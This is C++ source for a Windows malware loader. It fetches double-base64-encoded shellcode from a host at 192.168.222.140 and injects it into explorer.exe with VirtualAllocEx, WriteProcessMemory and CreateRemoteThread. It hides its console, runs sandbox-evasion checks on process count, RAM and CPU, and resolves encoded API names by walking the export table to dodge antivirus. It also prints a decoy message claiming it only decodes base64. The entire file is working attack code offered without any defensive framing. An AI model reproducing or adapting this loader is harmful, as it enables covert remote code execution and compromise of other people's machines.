#include <Windows.h>
#include <wininet.h>
#include <WinBase.h>
#include <TlHelp32.h>
#include <DbgHelp.h>
#include <Psapi.h>

#include <iostream>
#include <vector>
#include <cstdlib>
#include <string>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "wininet.lib")

using namespace std;


class Depend {
private:
	typedef BOOL(__stdcall* fCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
	BOOL(__stdcall* fpCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
	typedef BOOL(__stdcall* fCryptBinaryToStringA)(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);
	BOOL(__stdcall* fpCryptBinaryToStringA)(const BYTE*, DWORD, DWORD, LPSTR, DWORD*);

public:
	FARPROC AddrSolution(HMODULE hModule, LPCSTR lpProcName) {
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		PDWORD addrOfFunctions = (PDWORD)((PBYTE)hModule + exportDirectory->AddressOfFunctions);
		PWORD addrOfOrdinals = (PWORD)((PBYTE)hModule + exportDirectory->AddressOfNameOrdinals);
		PDWORD addrOfNames = (PDWORD)((PBYTE)hModule + exportDirectory->AddressOfNames);

		for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
			if (strcmp(lpProcName, (const char*)hModule + addrOfNames[i]) == 0) {
				return (FARPROC)((PBYTE)hModule + addrOfFunctions[addrOfOrdinals[i]]);
			}
		}

		return nullptr;
	}


	/*BOOL setupCrypts() {
		string cstb = "UTNKNWNIUlRkSEpwYm1kVWIwSnBibUZ5ZVVFPQ==";
		string cbts = "UTNKNWNIUkNhVzVoY25sVWIxTjBjbWx1WjBFPQ==";

		vector<BYTE> decoded1 = Base64Decode(cstb);
		string step1(decoded1.begin(), decoded1.end());

		vector<BYTE> dec1 = Base64Decode(cbts);
		string s1(dec1.begin(), dec1.end());

		vector<BYTE> decoded2 = Base64Decode(step1);
		string cryptstring(decoded2.begin(), decoded2.end());

		vector<BYTE> dec2 = Base64Decode(s1);
		string cryptbinary(dec2.begin(), dec2.end());

		HMODULE hCrypt32 = GetModuleHandleA("Crypt32.dll");

		if (hCrypt32 == NULL) return false;

		else {
			fCryptStringToBinaryA pCryptStringToBinaryA = (fCryptStringToBinaryA)AddrSolution(hCrypt32, cryptstring.c_str());
			fpCryptStringToBinaryA = pCryptStringToBinaryA;

			fCryptBinaryToStringA pCryptBinaryToStringA = (fCryptBinaryToStringA)AddrSolution(hCrypt32, cryptbinary.c_str());
			fpCryptBinaryToStringA = pCryptBinaryToStringA;

			if (fpCryptBinaryToStringA != NULL && fpCryptStringToBinaryA != NULL) return true;
			else false;
		}
	}*/


	DWORD GetParentPID(DWORD pid) {
		DWORD ppid = 0;
		PROCESSENTRY32W pe = { 0 };
		pe.dwSize = sizeof(PROCESSENTRY32W);

		HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		if (hSnapshot == INVALID_HANDLE_VALUE) return ppid;

		if (::Process32FirstW(hSnapshot, &pe)) {
			do {
				if (pe.th32ParentProcessID == pid) {
					ppid = pe.th32ParentProcessID;
					break;
				}
			} while (::Process32NextW(hSnapshot, &pe));
		}

		::CloseHandle(hSnapshot);

		return ppid;
	}


	DWORD FindProc(const wchar_t* lpProc) {
		PROCESSENTRY32W pe = { 0 };
		pe.dwSize = sizeof(PROCESSENTRY32W);
		DWORD pid = 0;

		HANDLE hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

		if (::Process32FirstW(hSnapshot, &pe)) {
			do {
				if (_wcsicmp(lpProc, pe.szExeFile) == 0) {
					pid = pe.th32ProcessID;
					break;
				}

			} while (::Process32NextW(hSnapshot, &pe));
		}

		::CloseHandle(hSnapshot);

		return pid;
	}


	/*string Base64Encode(const std::vector<BYTE>& input) {
		DWORD cbEncoded = 0;
		if (!::CryptBinaryToStringA(input.data(), input.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &cbEncoded)) {
			throw std::runtime_error("Failed to calculate encoded data length.");
		}

		std::string encodedData(cbEncoded, '\0');
		if (!::CryptBinaryToStringA(input.data(), input.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encodedData[0], &cbEncoded)) {
			throw std::runtime_error("Failed to encode data.");
		}

		return encodedData;
	}*/

	vector<BYTE> Base64Decode(const std::string& input) {
		DWORD cbDecoded = 0;
		if (!::CryptStringToBinaryA(input.c_str(), input.size(), CRYPT_STRING_BASE64, nullptr, &cbDecoded, nullptr, nullptr)) {
			throw std::runtime_error("Failed to calculate decoded data length.");
		}

		std::vector<BYTE> decodedData(cbDecoded);
		if (!::CryptStringToBinaryA(input.c_str(), input.size(), CRYPT_STRING_BASE64, decodedData.data(), &cbDecoded, nullptr, nullptr)) {
			throw std::runtime_error("Failed to decode data.");
		}

		return decodedData;
	}
};


class Mein {
private:
	CHAR username[260];
	DWORD bytesUsername = 260;


public:
	string checkUsername() {
		BOOL rv = ::GetUserNameA(username, &bytesUsername);

		if (rv != 0) {
			string name(username);

			return name;
		}

		else {
			return "";
		}
	}

	BOOL checkCPU() {
		SYSTEM_INFO si;
		::GetSystemInfo(&si);

		DWORD numberOfProccessors = si.dwNumberOfProcessors;

		if (numberOfProccessors >= 4) { // Don't forget it ( adjust it 5 )
			return true;
		}

		else {
			return true;
		}
	}

	BOOL checkRAM() {
		MEMORYSTATUSEX msx;
		msx.dwLength = sizeof(msx);

		::GlobalMemoryStatusEx(&msx);

		DWORD RAM = msx.ullTotalPhys / 1024 / 1024;

		if (RAM <= 6) {
			return false;
		}

		else {
			return true;
		}
	}


	BOOL checkNumberOfProcesses() {
		DWORD runningProcessIDs[1024];
		DWORD bytesRead;
		DWORD count;

		EnumProcesses(runningProcessIDs, sizeof(runningProcessIDs), &bytesRead);
		count = bytesRead / sizeof(DWORD);

		if (count < 50) return false;
		else return true;
	}
};

int main() {

	::AllocConsole();
	::Sleep((DWORD)1000);

	HWND stealth = FindWindowA("ConsoleWindowClass", nullptr);
	ShowWindow(stealth, 1000 - 1000);

	//string damnshell = "L0VpRDVQRG96QUFBQUVGUlFWQlNVVWd4MG1WSWkxSmdWa2lMVWhoSWkxSWdUVEhKU0ErM1NrcElpM0pRU0RIQXJEeGhmQUlzSUVIQnlRMUJBY0hpN1ZKSWkxSWdRVkdMUWp4SUFkQm1nWGdZQ3dJUGhYSUFBQUNMZ0lnQUFBQkloY0IwWjBnQjBJdElHRVNMUUNCUVNRSFE0MVpOTWNsSS84bEJpelNJU0FIV1NESEFyRUhCeVExQkFjRTQ0SFh4VEFOTUpBaEZPZEYxMkZoRWkwQWtTUUhRWmtHTERFaEVpMEFjU1FIUVFZc0VpRUZZUVZoSUFkQmVXVnBCV0VGWlFWcElnK3dnUVZMLzRGaEJXVnBJaXhMcFMvLy8vMTFKdm5kek1sOHpNZ0FBUVZaSmllWklnZXlnQVFBQVNZbmxTYndDQUNNcHdLamVqRUZVU1lua1RJbnhRYnBNZHlZSC85Vk1pZXBvQVFFQUFGbEJ1aW1BYXdELzFXb0tRVjVRVUUweHlVMHh3RWovd0VpSndrai93RWlKd1VHNjZnL2Y0UC9WU0luSGFoQkJXRXlKNGtpSitVRzZtYVYwWWYvVmhjQjBDa24vem5YbDZKTUFBQUJJZyt3UVNJbmlUVEhKYWdSQldFaUorVUc2QXRuSVgvL1ZnL2dBZmxWSWc4UWdYb24yYWtCQldXZ0FFQUFBUVZoSWlmSklNY2xCdWxpa1UrWC8xVWlKdzBtSngwMHh5VW1KOEVpSjJraUorVUc2QXRuSVgvL1ZnL2dBZlNoWVFWZFphQUJBQUFCQldHb0FXa0c2Q3k4UE1QL1ZWMWxCdW5WdVRXSC8xVW4venVrOC8vLy9TQUhEU0NuR1NJWDJkYlJCLytkWWFnQlpTY2ZDOExXaVZ2L1Y=";

	Mein M;
	Depend D;

	DWORD bytesRead = 0;
	string damnshell;
	const int sizee = 4096;
	CHAR buffer[sizee];

	HINTERNET hInternet = InternetOpenW(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
	if (!hInternet) return 3;

	HINTERNET hConnect = InternetConnectW(hInternet, L"192.168.222.140", INTERNET_DEFAULT_HTTP_PORT, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect) return 4;

	HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", L"/message.txt", nullptr, nullptr, nullptr, 0, 0);
	if (!hRequest) return 5;

	if (!HttpSendRequestW(hRequest, nullptr, 0, nullptr, 0)) {
		return 6;
	}

	while (InternetReadFile(hRequest, buffer, sizee, &bytesRead) && bytesRead != 0) {
		damnshell.append(buffer, bytesRead);
	}

	vector<BYTE> d11 = D.Base64Decode(damnshell);
	string ds1(d11.begin(), d11.end());
	vector<BYTE> d12 = D.Base64Decode(ds1);
	string shell(d12.begin(), d12.end());

	/*string cexplorer = "Wlhod2JHOXlaWEl1WlhobA==";
	vector<BYTE> cex1 = D.Base64Decode(cexplorer);
	string cex2(cex1.begin(), cex1.end());
	vector<BYTE> cex2 = D.Base64Decode(cex2);
	string sExplorerExe(cex2.begin(), cex2.end());*/

	DWORD pidforexplorer = D.FindProc(L"explorer.exe");

	/*DWORD parentPid = D.GetParentPID(::GetCurrentProcessId());
	WCHAR parentName[MAX_PATH + 1];
	DWORD dwParentName = MAX_PATH;

	HANDLE hParent = ::OpenProcess(PROCESS_ALL_ACCESS, false, parentPid);
	::QueryFullProcessImageNameW(hParent, 0, parentName, &dwParentName);
	::CharUpperW(parentName);

	if (wcsstr(parentName, L"WIRESHARK.EXE") || wcsstr(parentName, L"WINDBG.EXE")) return 1;*/

	BOOL retProcess = M.checkNumberOfProcesses();
	if (retProcess != false) {
		::Sleep(3000);

		BOOL retRAM = M.checkRAM();

		if (retRAM) {
			::Sleep((DWORD)3000);

			BOOL retCPU = M.checkCPU();

			if (retCPU) {
				char* mem = nullptr;
				mem = (char*)malloc(100000000);
				memset(mem, 00, (size_t)100000000);

				cout << "Hello, World!" << endl;
				cout << "This code only doing base64 decoding" << endl;

				if (mem != nullptr) {
					string fkernel32 = "YTJWeWJtVnNNekl1Wkd4cw==";
					string fVA = "Vm1seWRIVmhiRUZzYkc5ag==";

					vector<BYTE> decodedData = D.Base64Decode(fkernel32);
					string lastStepKernel32(decodedData.begin(), decodedData.end());

					vector<BYTE> lastDecoded = D.Base64Decode(lastStepKernel32);
					string sKernel32(lastDecoded.begin(), lastDecoded.end());

					HMODULE hKernel32 = ::GetModuleHandleA(sKernel32.c_str());

					if (hKernel32 == nullptr) return 2;

					::Sleep((DWORD)500);

					HANDLE hProcess = nullptr;

					string cop = "VDNCbGJsQnliMk5sYzNNPQ==";
					vector<BYTE> dec = D.Base64Decode(cop);
					string cop1(dec.begin(), dec.end());
					vector<BYTE> decc = D.Base64Decode(cop1);
					string sOpenProcess(decc.begin(), decc.end());

					typedef HANDLE(__stdcall* fOpenProcess)(DWORD, BOOL, DWORD);
					fOpenProcess pOpenProcess = (fOpenProcess)D.AddrSolution(hKernel32, sOpenProcess.c_str());

					string cexp = "Wlhod2JHOXlaWEl1WlhobA==";
					vector<BYTE> exp1 = D.Base64Decode(cexp);
					string cex1(exp1.begin(), exp1.end());
					vector<BYTE> exp2 = D.Base64Decode(cex1);
					string explorerexe(exp2.begin(), exp2.end());

					if (pOpenProcess != nullptr)
						hProcess = pOpenProcess(PROCESS_ALL_ACCESS, false, pidforexplorer);


					string cvae = "Vm1seWRIVmhiRUZzYkc5alJYZz0="; // VirtualAllocEx
					vector<BYTE> dec1 = D.Base64Decode(cvae);
					string step1cvae(dec1.begin(), dec1.end());
					vector<BYTE> dec2 = D.Base64Decode(step1cvae);
					string sVirtualAllocEx(dec2.begin(), dec2.end());

					typedef LPVOID(__stdcall* fVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
					fVirtualAllocEx pVirtualAllocEx = (fVirtualAllocEx)D.AddrSolution(hKernel32, sVirtualAllocEx.c_str());

					void* vmem = pVirtualAllocEx(hProcess, nullptr, shell.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


					string cwpm = "VjNKcGRHVlFjbTlqWlhOelRXVnRiM0o1"; // WriteProcessMemory
					vector<BYTE> de = D.Base64Decode(cwpm);
					string s1cw(de.begin(), de.end());
					vector<BYTE> de2 = D.Base64Decode(s1cw);
					string sWriteProcessMemory(de2.begin(), de2.end());

					typedef BOOL(__stdcall* fWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
					fWriteProcessMemory pWriteProcessMemory = (fWriteProcessMemory)D.AddrSolution(hKernel32, sWriteProcessMemory.c_str());

					pWriteProcessMemory(hProcess, vmem, shell.c_str(), shell.length(), nullptr);

					typedef HANDLE(__stdcall* fCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

					string ccrt = "UTNKbFlYUmxVbVZ0YjNSbFZHaHlaV0Zr"; // CreateRemoteThread
					vector<BYTE> c1 = D.Base64Decode(ccrt);
					string cs1(c1.begin(), c1.end());
					vector<BYTE> c2 = D.Base64Decode(cs1);
					string sCreateRemoteThread(c2.begin(), c2.end());

					fCreateRemoteThread pCreateRemoteThread = (fCreateRemoteThread)D.AddrSolution(hKernel32, sCreateRemoteThread.c_str());


					HANDLE th = pCreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)vmem, nullptr, 0, nullptr);
					WaitForSingleObject(th, INFINITE);
				}

			}
		}
	}

	return 0;
}
